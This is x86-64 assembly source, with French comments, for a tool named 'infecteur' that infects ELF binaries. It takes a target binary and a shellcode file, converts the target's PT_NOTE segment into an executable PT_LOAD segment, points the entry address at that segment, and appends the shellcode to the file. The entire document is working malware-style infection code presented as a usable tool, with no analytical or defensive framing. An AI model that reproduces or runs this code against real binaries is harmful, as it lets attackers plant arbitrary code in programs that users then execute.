BITS 64
default rel

; --- offsets Elf64_Ehdr ---
%define E_ENTRY  0x18
%define E_PHOFF  0x20
%define E_PHNUM  0x38

; --- offsets Elf64_Phdr ---
%define P_TYPE      0x00
%define P_FLAGS     0x04
%define P_OFFSET    0x08
%define P_VADDR     0x10
%define P_PADDR     0x18
%define P_FILESZ    0x20
%define P_MEMSZ     0x28
%define P_ALIGN     0x30
%define P_PHDR_SIZE 56

; types
%define PT_NOTE 4
%define PT_LOAD 1
%define PF_R    4
%define PF_X    1

section .data
    msg_usage db "Usage: ./infecteur <elf> <shellcode.bin>", 10
    msg_usage_len equ $ - msg_usage

section .bss
    fd: resq 1 ; on réserve 8 octets pour stocker le file descriptor
    fsize: resq 1   ; taille du fichier
    buf: resq 1

section .text
    global _start

_start:
    mov rax, [rsp]
    cmp rax, 3
    jl .usage

    ;open
    mov rdi, [rsp + 16]
    mov rsi, 2
    mov rax, 2  ; syscall ouvert
    syscall
    test rax, rax
    js .usage
    mov [fd], rax

    ;lseek
    mov rdi, [fd]
    xor rsi, rsi
    mov rdx, 2      ; SEEK_END
    mov rax, 8       ; syscall lseek
    syscall
    mov [fsize], rax    ; rax = taille du fichier

    ;partie mmap
    xor rdi, rdi            ; addr NULL
    mov rsi, [fsize]        ; longuer du fichier
    mov rdx, 3              ; PROT_READ et WRITE
    mov r10, 1
    mov r8, [fd]
    xor r9, r9
    mov rax, 9              ; mmap
    syscall
    mov [buf], rax
    mov rax, [buf]  ; base du fichier mappe
    mov rbx, [rax + E_PHOFF]    ; e_phoff = offset table phdrs
    add rbx, rax    ; rbx = adresse du 1er phdr
    movzx rcx, word [rax + E_PHNUM] ; nombre de segments
    xor r14, r14 ; r14 = max(vaddr + memsz) des LOAD

    .find_note:
    cmp dword [rbx + P_TYPE], PT_LOAD       ; c'est un LOAD ?
    jne .skip_max   ; non, on passe
    mov rdx, [rbx + P_VADDR]    ; vaddr du LOAD
    add rdx, [rbx + P_MEMSZ]    ; + memsz = fin du LOAD
    cmp rdx, r14    ; plus grand que le max actuel ?
    jle .skip_max   ; non, on passe
    mov r14, rdx    ; oui, on met a jour le max
.skip_max:

    cmp dword [rbx + P_TYPE], PT_NOTE       ; on compare la veleur p_type du phdr avec PT_NOTE
    je .found   ; si oui, saute a .found

    add rbx, P_PHDR_SIZE    ; phdr suivant (56 octets)
    dec rcx ; decremente le compteur
    jnz .find_note  ; si reste > 0, on reboucle
    mov rax, 60 ; syscall exit
    mov rdi, 1  ; code de retour 1 (erreur)
    syscall

    .found: ; label : PT_NOTE trouve

    ; vaddr = max(fsize, r14) arrondi au 0x1000 superieur
    mov rax, [fsize]    ; taille du fichier
    cmp rax, r14    ; fsize > fin du dernier LOAD ?
    jge .use_fsize  ; oui, on garde fsize
    mov rax, r14    ; non, on prend r14
.use_fsize:
    add rax, 0xFFF  ; arrondir au 0x1000 superieur
    and rax, ~0xFFF     ; enleve les 12 bits du bas
    mov r14, rax    ; r14 = vaddr finale (pour ftruncate)


    mov dword [rbx + P_TYPE], PT_LOAD   ; type = PT_LOAD
    mov dword [rbx + P_FLAGS], PF_R | PF_X ; flags = lisible + executable
    mov [rbx + P_OFFSET], rax ; offset = vaddr
    mov [rbx + P_VADDR], rax ; vaddr
    mov [rbx + P_PADDR], rax ; paddr
    mov qword [rbx + P_FILESZ], 0  ; filesz = 0 pour l'instant
    mov qword [rbx + P_MEMSZ], 0  ; memsz = 0 pour l'instant
    mov qword [rbx + P_ALIGN], 0x1000 ; alignement page
    mov rcx, [buf] ; base du fichier mappe
    mov [rcx + E_ENTRY], rax    ; e_entry = vaddr du shellcode

    ; ouvrir le shellcode
    mov rdi, [rsp + 24] ; argv[2] = chemin du shellcode
    xor rsi, rsi ; O_RDONLY
    mov rax, 2 ; syscall open
    syscall
    test rax, rax
    js .exit_ok ; si erreur, on sort proprement
    mov r11, rax ; on garde le fd dans r11
    mov rdi, r11 ;  on le remet dans rdi pour lseek
    xor rsi, rsi ; offset 0
    mov rdx, 2 ; SEEK_END
    mov rax, 8 ; syscall lseek
    syscall
    mov r15, rax ; r15 = taille du shellcode

    xor rdi, rdi ; addr = NULL
    mov rsi, r15 ; taille du shellcode
    mov rdx, 1 ; PROT_READ
    mov r10, 2 ; MAP_PRIVATE
    mov r8, r11 ; fd du shellcode
    xor r9, r9 ; offset 0
    mov rax, 9 ; syscall mmap
    syscall
    mov r13, rax ; r13 = pointeur vers le shellcode
    mov [rbx + P_FILESZ], r15 ; filesz = taille du shellcode
    mov [rbx + P_MEMSZ], r15 ; memsz = taille du shellcode


    ; append du shellcode
    ; 1 etendre le fichier a vaddr (r14)
    mov rdi, [fd]   ; fd du binaire cible
    mov rsi, r14    ; nouvelle taille = vaddr
    mov rax, 77     ; syscall ftruncate
    syscall

    ; 2 se placer a la fin du fichier
    mov rdi, [fd]
    xor rsi, rsi
    mov rdx, 2      ; SEEK_END
    mov rax, 8      ; syscall lseek
    syscall

    ; 3 ecrire le shellcode
    mov rdi, [fd]
    mov rsi, r13    ; pointeur vers le shellcode
    mov rdx, r15    ; taille du shellcode
    mov rax, 1      ; syscall write
    syscall

    ; exit(0)
    mov rax, 60
    xor rdi, rdi
    syscall

.exit_ok:
    mov rax, 60  ; syscall exit
    xor rdi, rdi ; code de retour 0
    syscall

.usage:
    mov rax, 1
    mov rdi, 1
    lea rsi, [msg_usage]
    mov rdx, msg_usage_len
    syscall

    mov rax, 60
    mov rdi, 1
    syscall